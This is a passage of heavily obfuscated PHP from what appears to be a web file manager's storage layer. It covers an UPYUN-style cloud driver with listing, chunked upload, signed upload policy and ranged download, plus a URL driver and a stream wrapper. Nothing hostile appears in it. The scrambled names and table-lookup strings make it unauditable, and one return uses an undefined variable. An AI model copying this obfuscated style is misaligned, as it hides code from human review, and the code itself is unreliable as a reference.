(!$¦º‰£ê‰) { return $Èõë­…; } } $Èõë­…[$æ¶„˜³…[233]] = intval($¦º‰£ê‰[$æ¶„˜³…[1568]]); $Èõë­…[$æ¶„˜³…[88]] = intval($¦º‰£ê‰[$æ¶„˜³…[1569]]); return $Èõë­…; } private function listObjs($Ì§¾æ, $Ä°·òÎÒ = 0, $ô™ô´Êª = 1000) { $Ô¸ë³ò =& $_SERVER[°‰†òö¯]; $øş¨ºÍ = array($Ô¸ë³ò[1570], $Ô¸ë³ò[1571] . $ô™ô´Êª); if ($Ä°·òÎÒ) { $øş¨ºÍ[] = $Ô¸ë³ò[1572] . $Ä°·òÎÒ; } $ÖŞ¢éçÆ = $this->ussRequest($Ì§¾æ, $Ô¸ë³ò[1494], !1, $øş¨ºÍ); return !$ÖŞ¢éçÆ[$Ô¸ë³ò[1295]] ? !1 : $ÖŞ¢éçÆ[$Ô¸ë³ò[1285]]; } private function fileList($â’õÛîÑ, &$ÅêÂĞÅ‰, &$äó–Š, $šÔçÌè = false) { $®á¶ç‡ =& $_SERVER[°‰†òö¯]; $ä¤ÓéÕ¿ = $®á¶ç‡[12]; $ƒâÊò¹¯ = 1000; $ˆ¾×å¢ƒ = rtrim($â’õÛîÑ, $®á¶ç‡[8]) . $®á¶ç‡[8]; while (!0) { check_abort(); $ö „ããö = $this->listObjs($â’õÛîÑ, $ä¤ÓéÕ¿, $ƒâÊò¹¯); if (!$ö „ããö) { return !1; } $ä¤ÓéÕ¿ = isset($ö „ããö[$®á¶ç‡[1573]]) ? $ö „ããö[$®á¶ç‡[1573]] : $®á¶ç‡[12]; $®š’âª¾ = isset($ö „ããö[$®á¶ç‡[1574]]) ? $ö „ããö[$®á¶ç‡[1574]] : array(); foreach ($®š’âª¾ as $ÃÛ”•ÔÂ) { $Ïâ—ØÍ³ = $ÃÛ”•ÔÂ[$®á¶ç‡[33]] == $®á¶ç‡[78] ? !0 : !1; $ùÌõºËŸ = ltrim($ˆ¾×å¢ƒ . $ÃÛ”•ÔÂ[$®á¶ç‡[32]], $®á¶ç‡[8]) . ($Ïâ—ØÍ³ ? $®á¶ç‡[8] : $®á¶ç‡[12]); $ò•Íê€ = array($®á¶ç‡[32] => $ùÌõºËŸ, $®á¶ç‡[33] => $Ïâ—ØÍ³ ? $®á¶ç‡[78] : $®á¶ç‡[232], $®á¶ç‡[79] => $ÃÛ”•ÔÂ[$®á¶ç‡[414]], $®á¶ç‡[1569] => $ÃÛ”•ÔÂ[$®á¶ç‡[1575]]); $this->cacheMethodInfoSet($ùÌõºËŸ, $Ïâ—ØÍ³, $ò•Íê€); if ($Ïâ—ØÍ³) { $ÅêÂĞÅ‰[] = $ùÌõºËŸ; if ($šÔçÌè) { $this->fileList($ùÌõºËŸ, $ÅêÂĞÅ‰, $äó–Š, $šÔçÌè); } continue; } $äó–Š[] = $ò•Íê€; } if (count($®š’âª¾) < $ƒâÊò¹¯) { break; } } $this->cacheMethodInfoSet($â’õÛîÑ, !0); } public function listPath($¯Ÿ¬»¡ù, $İ‡ğÙ°½ = false) { $¾ñÇË·› =& $_SERVER[°‰†òö¯]; $æ¹¿ù‚Ù = $¯Øõáè° = array(); $this->fileList($¯Ÿ¬»¡ù, $æ¹¿ù‚Ù, $¯Øõáè°); foreach ($æ¹¿ù‚Ù as $ªş‚”ò => $èÂé×Ó) { $æ¹¿ù‚Ù[$ªş‚”ò] = $this->folderInfo($èÂé×Ó, $İ‡ğÙ°½); } foreach ($¯Øõáè° as $ªş‚”ò => $èÂé×Ó) { $¯Øõáè°[$ªş‚”ò] = $this->fileInfo($èÂé×Ó[$¾ñÇË·›[32]], $İ‡ğÙ°½, $èÂé×Ó); } return array($¾ñÇË·›[85] => $æ¹¿ù‚Ù, $¾ñÇË·›[86] => $¯Øõáè°); } public function has($ìƒÑç±û, $í—Âšè = false, $Ñâè‡Íı = true) { $˜Ó¶ÂÚ =& $_SERVER[°‰†òö¯]; $°Ş°Ê°¨ = $˜Ó¶ÂÚ[12]; $Ó öƒÈ = 500; $ùğ÷±ÅÕ = 0; $¹–Ê–´ = 0; $¤Ç¶çëŸ = rtrim($ìƒÑç±û, $˜Ó¶ÂÚ[8]) . $˜Ó¶ÂÚ[8]; while (!0) { check_abort(); $‘àñğãõ = $this->listObjs($ìƒÑç±û, $°Ş°Ê°¨, $Ó öƒÈ); if (!$‘àñğãõ) { return !1; } $°Ş°Ê°¨ = isset($‘àñğãõ[$˜Ó¶ÂÚ[1573]]) ? $‘àñğãõ[$˜Ó¶ÂÚ[1573]] : $˜Ó¶ÂÚ[12]; $îÚı¶Î = isset($‘àñğãõ[$˜Ó¶ÂÚ[1574]]) ? $‘àñğãõ[$˜Ó¶ÂÚ[1574]] : array(); if (empty($îÚı¶Î)) { break; } $É½İå£¹ = array_filter($îÚı¶Î, function ($­€°Ö®†) { $¸Öø²÷Ò =& $_SERVER[°‰†òö¯]; return $­€°Ö®†[$¸Öø²÷Ò[33]] == $¸Öø²÷Ò[78]; }); $ÈéåçÂü = count($îÚı¶Î); $É½İå£¹ = count($É½İå£¹); $ô¾©úÖ´ = $ÈéåçÂü - $É½İå£¹; if ($í—Âšè) { $¹–Ê–´ += $É½İå£¹; $ùğ÷±ÅÕ += $ô¾©úÖ´; if ($ÈéåçÂü < $Ó öƒÈ) { break; } continue; } if ($Ñâè‡Íı) { if ($ô¾©úÖ´) { return !0; } } else { if ($É½İå£¹) { return !0; } } if ($ÈéåçÂü < $Ó öƒÈ) { break; } } if ($í—Âšè) { return array($˜Ó¶ÂÚ[241] => $ùğ÷±ÅÕ, $˜Ó¶ÂÚ[242] => $¹–Ê–´); } return !1; } public function listAll($© Ğå—) { $Á´è¹« =& $_SERVER[°‰†òö¯]; $£µöúø² = $©”õ’ß = array(); $this->fileList($© Ğå—, $£µöúø², $©”õ’ß, !0); $ËÕƒ•¥İ = array_to_keyvalue($©”õ’ß, $Á´è¹«[32]); foreach ($£µöúø² as $‰ôõÖ») { if (is_string($‰ôõÖ»)) { $ËÕƒ•¥İ[$‰ôõÖ»] = array($Á´è¹«[79] => 0); } } return $this->listAllFiles($© Ğå—, $ËÕƒ•¥İ); } public function canRead($³Ä¬„ê) { return $this->exist($³Ä¬„ê) ? !0 : !1; } public function canWrite($¼…ô½¼·) { return $this->exist($¼…ô½¼·) ? !0 : !1; } public function getContent($À¢Ğ‘ı) { return $this->fileSubstr($À¢Ğ‘ı, 0, -1); } public function setContent($­ÙïÎó, $İºÌ€ìó = '') { $ÏºÄéÂ =& $_SERVER[°‰†òö¯]; if (!$İºÌ€ìó) { $øÖ÷¢¥Ì = $this->ussRequest($­ÙïÎó, $ÏºÄéÂ[290]); return $øÖ÷¢¥Ì[$ÏºÄéÂ[1295]]; } $ïìÙØâğ = $this->tempFile($this->pathThis($­ÙïÎó)); file_put_contents($ïìÙØâğ, $İºÌ€ìó); if ($this->upload($­ÙïÎó, $ïìÙØâğ)) { $this->tempFileRemve($ïìÙØâğ); return !0; } return !1; } public function fileSubstr($ß×²“¼Ò, $·…õ¨ë´, $ó‡×Å½€) { $Åí•˜¢´ =& $_SERVER[°‰†òö¯]; if (!($õñóÕÁ¤ = $this->link($ß×²“¼Ò))) { return !1; } $ˆœª­Êí = !1; if ($ó‡×Å½€ > 0) { $¥úŸÅÎ¢ = $·…õ¨ë´ + $ó‡×Å½€ - 1; $ˆœª­Êí = array($Åí•˜¢´[1534] . $·…õ¨ë´ . $Åí•˜¢´[464] . $¥úŸÅÎ¢); } $¤õÌ„Ò… = url_request($õñóÕÁ¤, $Åí•˜¢´[1494], !1, $ˆœª­Êí); return $¤õÌ„Ò…[$Åí•˜¢´[811]] ? $¤õÌ„Ò…[$Åí•˜¢´[1285]] : !1; } public function upload($àªÉ¿˜û, $à’‰Ğ¾Ú, $™•ğÎñ„ = false, $ï¢èø”½ = REPEAT_REPLACE) { $ö³ÜñÑ =& $_SERVER[°‰†òö¯]; $ŸãÃØà‚ = IO::size($à’‰Ğ¾Ú); if ($ŸãÃØà‚ <= 1024 * 1024 * 200) { $¶Ó¼ğ³“ = array($ö³ÜñÑ[1576] . $à’‰Ğ¾Ú); $£…Õî×« = $this->ussRequest($àªÉ¿˜û, $ö³ÜñÑ[255], $¶Ó¼ğ³“); return $£…Õî×«[$ö³ÜñÑ[1295]] ? $this->getPathOuter($àªÉ¿˜û) : !1; } $æ–•ÛÍ¿ = 1024 * 1024 * 10; $°ú©âÁè = array($ö³ÜñÑ[1577], $ö³ÜñÑ[1578] . $ŸãÃØà‚, $ö³ÜñÑ[1579], $ö³ÜñÑ[1580] . $æ–•ÛÍ¿); $£…Õî×« = $this->ussRequest($àªÉ¿˜û, $ö³ÜñÑ[255], !1, $°ú©âÁè); if (!$£…Õî×«[$ö³ÜñÑ[1295]]) { return !1; } $À“£æ£ = $£…Õî×«[$ö³ÜñÑ[1285]]; $ãœàëœÓ = 0; $Ñ»§ØË = $À“£æ£[$ö³ÜñÑ[1581]]; $ÚÛ‹›Ş” = fopen($à’‰Ğ¾Ú, $ö³ÜñÑ[1457]); if (!$ÚÛ‹›Ş”) { return !1; } do { $‘Â¯¿êõ = $À“£æ£[$ö³ÜñÑ[1582]]; fseek_64($ÚÛ‹›Ş”, $ãœàëœÓ); $šìëœå„ = fread($ÚÛ‹›Ş”, $‘Â¯¿êõ); $ßÈë’ïù = 0; do { $ßÈë’ïù++; $À“£æ£ = $this->uploadPart($àªÉ¿˜û, $À“£æ£, $šìëœå„); } while (!$À“£æ£ && $ßÈë’ïù < 3); if (!$À“£æ£) { return !1; } $Ñ»§ØË = $À“£æ£[$ö³ÜñÑ[1581]]; $ãœàëœÓ += $‘Â¯¿êõ; } while ($Ñ»§ØË != -1); fclose($ÚÛ‹›Ş”); $°ú©âÁè = array($ö³ÜñÑ[1583], $ö³ÜñÑ[1584] . $À“£æ£[$ö³ÜñÑ[1585]], $ö³ÜñÑ[1579]); $£…Õî×« = $this->ussRequest($àªÉ¿˜û, $ö³ÜñÑ[255], !1, $°ú©âÁè); return $£…Õî×«[$ö³ÜñÑ[1295]] ? $this->getPathOuter($ï’˜†ø¦) : !1; } private function uploadPart($ÒŠÁ¾™Ç, $ºìï‹¿Û, &$¼ƒ·ÆĞ) { $¯¾ÀØ„Ÿ =& $_SERVER[°‰†òö¯]; $ÚÊıë¦€ = array($¯¾ÀØ„Ÿ[1586], $¯¾ÀØ„Ÿ[1584] . $ºìï‹¿Û[$¯¾ÀØ„Ÿ[1585]], $¯¾ÀØ„Ÿ[1587] . $ºìï‹¿Û[$¯¾ÀØ„Ÿ[1581]], $¯¾ÀØ„Ÿ[146] . $ºìï‹¿Û[$¯¾ÀØ„Ÿ[1582]]); $ãšÈÂ²ª = $this->ussRequest($ÒŠÁ¾™Ç, $¯¾ÀØ„Ÿ[255], $¼ƒ·ÆĞ, $ÚÊıë¦€); return !$ãšÈÂ²ª[$¯¾ÀØ„Ÿ[1295]] ? $ãšÈÂ²ª[$¯¾ÀØ„Ÿ[1295]] : $ãšÈÂ²ª[$¯¾ÀØ„Ÿ[1285]]; } public function uploadFormData($ÉÂıæÑæ, $öˆ³Ë‰Ó = 3600) { return $this->uploadPolicy($ÉÂıæÑæ, $öˆ³Ë‰Ó); } public function uploadMultiData($±ØæĞ¶æ, $»”€Ğ¦Ğ = 3600) { $õ²üÉØğ =& $_SERVER[°‰†òö¯]; $£—×ÊÕØ = (int) $GLOBALS[$õ²üÉØğ[7]][$õ²üÉØğ[79]]; return $this->uploadPolicy($±ØæĞ¶æ, $»”€Ğ¦Ğ, $£—×ÊÕØ); } private function uploadPolicy($Šìàğ³, $Ÿ¸½à…æ = 3600, $üçô·¦  = 0) { $ı‚ªÙ =& $_SERVER[°‰†òö¯]; $¿ñİˆ¦ = $ı‚ªÙ[8] . $this->bucket; $»ïŒ¾¥ = gmdate($ı‚ªÙ[1492]); $ÄŸ¨Ú¶™ = array($ı‚ªÙ[1588] => $this->bucket, $ı‚ªÙ[1589] => $Šìàğ³, $ı‚ªÙ[1590] => time() + $Ÿ¸½à…æ, $ı‚ªÙ[1591] => $»ïŒ¾¥); if ($üçô·¦ ) { $ÄŸ¨Ú¶™[$ı‚ªÙ[1477]] = $üçô·¦ ; } $¥¥Ğõü¥ = base64_encode(json_encode($ÄŸ¨Ú¶™)); $‡Óó°”ü = base64_encode(hash_hmac($ı‚ªÙ[1545], "\120\117\123\x54\46{$¿ñİˆ¦}\x26{$»ïŒ¾¥}\x26{$¥¥Ğõü¥}", md5("{$this->userpass}"), !0)); $Ğ¿Å¾®Î = array($ı‚ªÙ[279] => $¥¥Ğõü¥, $ı‚ªÙ[1592] => "\x55\x50\x59\125\x4e\x20{$this->username}\72{$‡Óó°”ü}", $ı‚ªÙ[208] => $this->endpoint . $¿ñİˆ¦); return $Ğ¿Å¾®Î; } public function download($–¹íÙ€, $Ú©æ°¤) { $À«•ò× = IO::getPathInner(IO::mkfile($Ú©æ°¤)); if (!($ìÁçìê¥ = $this->link($–¹íÙ€))) { return !1; } $ôìª÷Ÿ— = 0; $ŠÂÃİÁõ = 1024 * 200; $ßû×ªâ´ = fopen($À«•ò×, $_SERVER[°‰†òö¯][1540]); while (!0) { $©Çı²î³ = $this->fileSubstr($–¹íÙ€, $ôìª÷Ÿ—, $ŠÂÃİÁõ); if ($©Çı²î³ === !1) { return !1; } fwrite($ßû×ªâ´, $©Çı²î³); $ôìª÷Ÿ— += $ŠÂÃİÁõ; if (strlen($©Çı²î³) < $ŠÂÃİÁõ) { break; } } fclose($ßû×ªâ´); return $Ú©æ°¤; } public function link($†¡úñÕ¡, $ôÈ¿şÒÁ = array()) { $÷Ğù¦²ú =& $_SERVER[°‰†òö¯]; $†¡úñÕ¡ = trim($†¡úñÕ¡, $÷Ğù¦²ú[8]); if (!empty($this->token)) { $Øí»Å° = strtotime(date($÷Ğù¦²ú[1593])); $ÂÀùÖ’Ñ = substr(md5($this->token . $÷Ğù¦²ú[286] . $Øí»Å° . $÷Ğù¦²ú[1594] . $†¡úñÕ¡), 12, 8) . $Øí»Å°; $ôÈ¿şÒÁ[] = $÷Ğù¦²ú[1595] . $ÂÀùÖ’Ñ; } $·‚È ½Å = !empty($ôÈ¿şÒÁ) ? $÷Ğù¦²ú[76] . implode($÷Ğù¦²ú[286], $ôÈ¿şÒÁ) : $÷Ğù¦²ú[12]; return $this->getHost() . $÷Ğù¦²ú[8] . $this->pathEncode($†¡úñÕ¡) . $·‚È ½Å; } public function fileOut($ÕÛ£Ô, $äûœı¦¬ = false, $ó¡ÚÈïÎ = false, $Ü¸Ù¸Èµ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ÕÛ£Ô, $äûœı¦¬, $ó¡ÚÈïÎ, $Ü¸Ù¸Èµ); } if (!$ó¡ÚÈïÎ) { $ó¡ÚÈïÎ = $this->pathThis($ÕÛ£Ô); } $‹øô«ºø = $äûœı¦¬ ? array($_SERVER[°‰†òö¯][1596] . rawurlencode($ó¡ÚÈïÎ)) : array(); $İ”ôø§˜ = $this->link($ÕÛ£Ô, $‹øô«ºø); $this->fileOutLink($İ”ôø§˜); } public function fileOutServer($³ÖÔê‰â, $Âø„ë•ß = false, $Äôµ÷ï½ = false, $²™áŠ® = '') { parent::fileOut($³ÖÔê‰â, $Âø„ë•ß, $Äôµ÷ï½, $²™áŠ®); } public function fileOutImage($ºŒîšĞ, $Ğú¥Šö = 250) { $»±‘‰§å = $this->link($ºŒîšĞ . $_SERVER[°‰†òö¯][1597] . $Ğú¥Šö); $this->fileOutLink($»±‘‰§å); } public function fileOutImageServer($½±’‘Ñä, $ÀÃµ“Ú = 250) { parent::fileOutImage($½±’‘Ñä, $ÀÃµ“Ú); } public function hashMd5($—¯Û˜‹) { $ê™Ùõ¤‡ =& $_SERVER[°‰†òö¯]; $ĞƒÓËè = $this->_objectMeta($—¯Û˜‹); return isset($ĞƒÓËè[$ê™Ùõ¤‡[247]]) ? $ĞƒÓËè[$ê™Ùõ¤‡[247]] : !1; } public function size($¶¤ñ–‘Å) { $İ½î¾ç— = $this->objectMeta($¶¤ñ–‘Å); return $İ½î¾ç— ? $İ½î¾ç—[$_SERVER[°‰†òö¯][79]] : 0; } public function info($ìÌ‡™Æ) { if ($this->isFolder($ìÌ‡™Æ)) { return $this->folderInfo($ìÌ‡™Æ); } else { if ($this->isFile($ìÌ‡™Æ)) { return $this->fileInfo($ìÌ‡™Æ); } } return !1; } public function exist($¾ıÍ÷ïÚ) { return $this->isFile($¾ıÍ÷ïÚ) || $this->isFolder($¾ıÍ÷ïÚ); } public function isFile($€ò‰‘»ú) { return !$this->isFolder($€ò‰‘»ú) && $this->objectMeta($€ò‰‘»ú); } public function isFolder($ãíøãéå) { return $this->cacheMethod($_SERVER[°‰†òö¯][179], $ãíøãéå); } protected function objectMeta($«æïŒÄ±) { return $this->cacheMethod($_SERVER[°‰†òö¯][181], $«æïŒÄ±); } protected function _objectMeta($ëÂí¡§Ó) { $‘Ë­º•Ï =& $_SERVER[°‰†òö¯]; if ($ëÂí¡§Ó == $‘Ë­º•Ï[12] || $ëÂí¡§Ó == $‘Ë­º•Ï[8]) { return array(); } $‰øø“ç¼ = $this->ussRequest($ëÂí¡§Ó, $‘Ë­º•Ï[1598]); if (!$‰øø“ç¼[$‘Ë­º•Ï[1295]]) { return null; } $Š¤ª×ğ = isset($‰øø“ç¼[$‘Ë­º•Ï[1285]]) ? $‰øø“ç¼[$‘Ë­º•Ï[1285]] : array(); if (!isset($Š¤ª×ğ[$‘Ë­º•Ï[1599]])) { return null; } $™–ôÖ ¡ = array($‘Ë­º•Ï[33] => isset($Š¤ª×ğ[$‘Ë­º•Ï[1599]]) ? $Š¤ª×ğ[$‘Ë­º•Ï[1599]] : null, $‘Ë­º•Ï[79] => isset($Š¤ª×ğ[$‘Ë­º•Ï[1600]]) ? $Š¤ª×ğ[$‘Ë­º•Ï[1600]] : null, $‘Ë­º•Ï[247] => isset($Š¤ª×ğ[$‘Ë­º•Ï[1601]]) ? $Š¤ª×ğ[$‘Ë­º•Ï[1601]] : null, $‘Ë­º•Ï[1568] => isset($Š¤ª×ğ[$‘Ë­º•Ï[1602]]) ? $Š¤ª×ğ[$‘Ë­º•Ï[1602]] : null); $™–ôÖ ¡[$‘Ë­º•Ï[1569]] = isset($Š¤ª×ğ[$‘Ë­º•Ï[1603]]) ? strtotime($Š¤ª×ğ[$‘Ë­º•Ï[1603]]) : $™–ôÖ ¡[$‘Ë­º•Ï[1568]]; return $™–ôÖ ¡; } protected function _isFolder($Òò“à) { $®ì›ïù =& $_SERVER[°‰†òö¯]; if ($Òò“à == $®ì›ïù[12] || $Òò“à == $®ì›ïù[8]) { return !0; } $ºµ÷Ç·¸ = $this->_objectMeta($Òò“à); return isset($ºµ÷Ç·¸[$®ì›ïù[33]]) && $ºµ÷Ç·¸[$®ì›ïù[33]] == $®ì›ïù[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ãëı·ÀÒ = false) { } public function exist($ÔÊÌ–§) { $À¯½ÑÉ = $this->info($ÔÊÌ–§); return $À¯½ÑÉ[$_SERVER[°‰†òö¯][234]]; } public function isFile($º££†Ëß) { $º•¸Óò = $this->info($º££†Ëß); return $º•¸Óò[$_SERVER[°‰†òö¯][234]]; } public function isFolder($ÁãêËë) { return !1; } public function size($•Îˆ¬¯˜) { $ßÉè»ùş = $this->info($•Îˆ¬¯˜); return $ßÉè»ùş[$_SERVER[°‰†òö¯][79]]; } public function info($´¯ˆÖï) { return $this->infoParse($´¯ˆÖï); } public function infoAuth($•Ê¢Àë†) { return $this->infoParse($•Ê¢Àë†); } public function infoWithChildren($ëõ²ú˜™) { return $this->infoParse($ëõ²ú˜™); } public function infoFull($åñ¶Ÿï¡) { return $this->infoParse($åñ¶Ÿï¡); } private function infoParse($Ì±îŠÄ×) { $’÷±š°± =& $_SERVER[°‰†òö¯]; $Ğ—§íÇ× = $this->header($Ì±îŠÄ×); if (!$Ğ—§íÇ× || !$Ğ—§íÇ×[$’÷±š°±[811]]) { return !1; } $çúŒóÌ = _get($Ğ—§íÇ×, $’÷±š°±[414], 0); $±µĞ–ôã = array($’÷±š°±[32] => $Ğ—§íÇ×[$’÷±š°±[32]], $’÷±š°±[87] => $Ì±îŠÄ×, $’÷±š°±[33] => $’÷±š°±[232], $’÷±š°±[79] => intval($çúŒóÌ), $’÷±š°±[169] => get_path_ext($Ğ—§íÇ×[$’÷±š°±[32]]), $’÷±š°±[1454] => $çúŒóÌ > 0 && $Ğ—§íÇ×[$’÷±š°±[1604]], $’÷±š°±[1455] => !1); return $±µĞ–ôã; } private function header($¯ˆæ¥üÎ) { $ƒçÀ£Â =& $_SERVER[°‰†òö¯]; if (isset(self::$_cacheHeader[$¯ˆæ¥üÎ])) { return self::$_cacheHeader[$¯ˆæ¥üÎ]; } $…™Ô®© = isset($GLOBALS[$ƒçÀ£Â[1605]]) ? $GLOBALS[$ƒçÀ£Â[1605]] : !1; $GLOBALS[$ƒçÀ£Â[1605]] = !0; self::$_cacheHeader[$¯ˆæ¥üÎ] = url_header($¯ˆæ¥üÎ); $GLOBALS[$ƒçÀ£Â[1605]] = $…™Ô®©; return self::$_cacheHeader[$¯ˆæ¥üÎ]; } public function hashSimple($÷”Šéè, $äİÎÓñ = false) { $»—ßáĞÍ =& $_SERVER[°‰†òö¯]; $Šë×¢ÎÆ = $this->info($÷”Šéè); if (!$Šë×¢ÎÆ || !$Šë×¢ÎÆ[$»—ßáĞÍ[234]]) { return !1; } $“ÔÇñóÊ = $Šë×¢ÎÆ[$»—ßáĞÍ[79]]; $ôŞ¾Ú³ = 200; $¯å±å = 50; if ($“ÔÇñóÊ <= $ôŞ¾Ú³ * $¯å±å) { return md5($this->fileSubstr($÷”Šéè, 0, $“ÔÇñóÊ)) . $“ÔÇñóÊ; } $öØŒ¸âİ = intval($“ÔÇñóÊ / $¯å±å); $©¤‘—³½ = $»—ßáĞÍ[12]; $½œÏßÊ» = timeFloat(); $ûÓ‚“â’ = 15; for ($ÈïÉœû = 0; $ÈïÉœû < $¯å±å; $ÈïÉœû++) { if (timeFloat() - $½œÏßÊ» > $ûÓ‚“â’) { return !1; } $ªª‡ş’å = $this->fileSubstr($÷”Šéè, $öØŒ¸âİ * $ÈïÉœû, $ôŞ¾Ú³); if (!$ªª‡ş’å) { return !1; } $©¤‘—³½ .= $ªª‡ş’å; } $©¤‘—³½ .= $this->fileSubstr($÷”Šéè, $“ÔÇñóÊ - $ôŞ¾Ú³, $ôŞ¾Ú³); return md5($©¤‘—³½) . $“ÔÇñóÊ; } public function getContent($úçöØÂß) { return $this->fileSubstr($úçöØÂß); } public function fileSubstr($–À¸Èî, $á®›ÂªÄ = 0, $›ûéÜ = -1) { $ÂºúŞÔ¦ =& $_SERVER[°‰†òö¯]; $´Öœ˜Â = $this->info($–À¸Èî); if (!$´Öœ˜Â || !$´Öœ˜Â[$ÂºúŞÔ¦[234]] && $´Öœ˜Â[$ÂºúŞÔ¦[79]] > 1024 * 1024 * 10) { return !1; } if ($›ûéÜ === -1) { $›ûéÜ = $´Öœ˜Â[$ÂºúŞÔ¦[79]]; } if ($›ûéÜ == 0) { return $ÂºúŞÔ¦[12]; } $®›ªæŒà = array($ÂºúŞÔ¦[1606] . $á®›ÂªÄ . $ÂºúŞÔ¦[848] . ($á®›ÂªÄ + $›ûéÜ - 1)); $î¹üüé = url_request($–À¸Èî, $ÂºúŞÔ¦[1494], !1, $®›ªæŒà, !1, !1, 30); return $î¹üüé[$ÂºúŞÔ¦[1285]] ? $î¹üüé[$ÂºúŞÔ¦[1285]] : $ÂºúŞÔ¦[12]; } public function download($úˆŞŞê€, $Ğ Ğ”€û) { Downloader::start($úˆŞŞê€, $Ğ Ğ”€û); return $Ğ Ğ”€û; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ŸÃç¦Â×, $Øï­šûı = '') { $this->info = $this->info($ŸÃç¦Â×); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[°‰†òö¯][87]]; $this->pathOpen = $ŸÃç¦Â×; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ŸÃç¦Â×])) { self::$_chunkBuffer[$ŸÃç¦Â×] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Çæ İÕß) { $‡Ò…¾ª = $this->fileSubstr($this->pose, $Çæ İÕß); $this->pose += strlen($‡Ò…¾ª); return $‡Ò…¾ª; } public function stream_tell() { return $this->pose; } public function stream_seek($”Ñä‘³½, $†Ú½®ÏÌ) { $Æ‘…Ğõ =& $_SERVER[°‰†òö¯]; if ($†Ú½®ÏÌ == SEEK_SET) { $this->pose = $”Ñä‘³½; } else { if ($†Ú½®ÏÌ == SEEK_CUR) { $this->pose += $”Ñä‘³½; } else { if ($†Ú½®ÏÌ == SEEK_END) { $this->pose = $this->info[$Æ‘…Ğõ[79]] + intval($”Ñä‘³½); } } } if ($”Ñä‘³½ < 0) { $this->pose = $this->info[$Æ‘…Ğõ[79]] + $”Ñä‘³½; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[°‰†òö¯][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¤·íÊçÚ, $ùÚáŠ±µ) { $€ƒ¥Ö•ç =& $_SERVER[°‰†òö¯]; $Îé•ãšú = $this->info($¤·íÊçÚ); return array($€ƒ¥Ö•ç[1398] => 0, $€ƒ¥Ö•ç[1607] => 0, $€ƒ¥Ö•ç[16] => 32768 + 511, $€ƒ¥Ö•ç[1608] => 0, $€ƒ¥Ö•ç[1609] => 0, $€ƒ¥Ö•ç[1610] => 0, $€ƒ¥Ö•ç[1611] => 0, $€ƒ¥Ö•ç[79] => $Îé•ãšú[$€ƒ¥Ö•ç[79]], $€ƒ¥Ö•ç[1612] => $Îé•ãšú[$€ƒ¥Ö•ç[1453]], $€ƒ¥Ö•ç[1569] => $Îé•ãšú[$€ƒ¥Ö•ç[88]], $€ƒ¥Ö•ç[1568] => $Îé•ãšú[$€ƒ¥Ö•ç[233]], $€ƒ¥Ö•ç[1613] => 0, $€ƒ¥Ö•ç[1614] => 0); } static $fileInfo = array(); public function info($ß³ÇŠÀ¿) { $Àßß×Ü = $_SERVER[°‰†òö¯][1615]; if (isset(self::$fileInfo[$ß³ÇŠÀ¿])) { return self::$fileInfo[$ß³ÇŠÀ¿]; } if (substr($ß³ÇŠÀ¿, 0, strlen($Àßß×Ü)) != $Àßß×Ü) { return !1; } self::$fileInfo[$ß³ÇŠÀ¿] = IO::info(substr($ß³ÇŠÀ¿, strlen($Àßß×Ü))); return self::$fileInfo[$ß³ÇŠÀ¿]; } public static function read($¿İªÅç“, $È¬´”ü, $½ÈÈŸò) { if (!isset(self::$_fopenCache[$¿İªÅç“])) { $úüÅç¹‰ = new StreamWrapperIO(); $úüÅç¹‰->stream_open($¿İªÅç“); self::$_fopenCache[$¿İªÅç“] = $úüÅç¹‰; } $úüÅç¹‰ = self::$_fopenCache[$¿İªÅç“]; return $úüÅç¹‰->fileSubstr($È¬´”ü, $½ÈÈŸò); } public static function _read($¸‰İëÇª, $šÜ ²Ì”, $şâ„ä„) { $ÎÂÎÆ¹ =& $_SERVER[°‰†òö¯]; $ğ²ä×Ô® = fopen($¸‰İëÇª, $ÎÂÎÆ¹[1457]); if (!$ğ²ä×Ô®) { return $ÎÂÎÆ¹[12]; } $…œˆÀ¶Ğ = 8192; fseek($ğ²ä×Ô®, $šÜ ²Ì”, SEEK_SET); $º¯Îê–Œ = $ÎÂÎÆ¹[12]; $¿¶Í·Óí = 0; while ($¿¶Í·Óí < $şâ„ä„) { $ÛÔĞÍ³­ = min($…œˆÀ¶Ğ, $şâ„ä„ - $¿¶Í·Óí); $º¯Îê–Œ .= fread($ğ²ä×Ô®, $ÛÔĞÍ³­); $¿¶Í·Óí += $ÛÔĞÍ³­; } fclose($ğ²ä×Ô®); return $º¯Îê–Œ; } public function fileSubstr($ò±‚ò•é, $¡¿š›Ï«) { $‹îªå§å =& $_SERVER[°‰†òö¯]; $òş–ºÀÁ = $this->info[$‹îªå§å[79]]; $á¸ø”ä = $ò±‚ò•é; $ÚÒÌè€™ = $¡¿š›Ï«; if ($ò±‚ò•é < 0) { $ò±‚ò•é = $òş–ºÀÁ + $ò±‚ò•é; } if ($¡¿š›Ï« === !1) { $¡¿š›Ï« = $òş–ºÀÁ - $ò±‚ò•é; } if ($ò±‚ò•é + $¡¿š›Ï« > $òş–ºÀÁ) { $¡¿š›Ï« = $òş–ºÀÁ - $ò±‚ò•é; } if ($¡¿š›Ï« <= 0) { return $‹îªå§å[12]; } if ($ò±‚ò•é < 0 || $ò±‚ò•é >= $òş–ºÀÁ || $¡¿š›Ï« <= 0 || $¡¿š›Ï« > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\x6c\145\122\145\141\x64\x20\145\x72\162\x6f\x72\x21\40\x73\164\141\x72\164\75{$ò±‚ò•é}\x3b\154\x65\x6e\147\x74\150\75{$¡¿š›Ï«}\x3b\x20\163\151\x7a\x65\x3d{$òş–ºÀÁ}\x3b"); } $‰˜Ì© = 64 * 1024; $¦Ä‚·ø± =& self::$_chunkBuffer[$this->path]; if (!$¦Ä‚·ø±) { $¦Ä‚·ø± = array(); } $úË¶¡¤â = 0; $õ’ôíá¼ = 0; $²ä†¸ÕÔ = $‹îªå§å[12]; foreach ($¦Ä‚·ø± as $úË¶¡¤â => $²ä†¸ÕÔ) { 